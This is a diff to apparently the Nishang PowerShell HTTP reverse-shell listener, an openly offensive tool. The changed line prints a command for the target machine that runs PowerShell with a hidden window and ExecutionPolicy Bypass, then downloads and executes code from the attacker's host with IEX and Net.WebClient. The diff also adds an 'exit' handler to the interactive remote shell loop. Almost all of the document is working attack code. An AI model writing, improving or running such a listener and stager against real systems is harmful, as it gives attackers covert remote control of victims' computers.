@@ -73,7 +73,7 @@ https://github.com/samratashok/nishang
         $listener.Start()
         Write-Output "Listening on $Port"
         Write-Output "Run the following command on the target:"
-        Write-Output "iex (New-Object Net.WebClient).DownloadString(""http://$IPAddress`:$Port/connect"")"
+        Write-Output "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('http://$IPAddress`:$Port/connect'))"
 
         while ($true) 
         {
@@ -110,6 +110,16 @@ https://github.com/samratashok/nishang
             {  
                 $response.ContentType = 'text/plain'
                 $message = Read-Host "PS $hostip>"		
+                if ($message -eq "exit")
+                {
+                    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+                    $response.ContentLength64 = $buffer.length
+                    $output = $response.OutputStream
+                    $output.Write($buffer, 0, $buffer.length)
+                    $output.Close()
+                    $listener.Stop()
+                    break
+                }
             }
             if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) 
             {
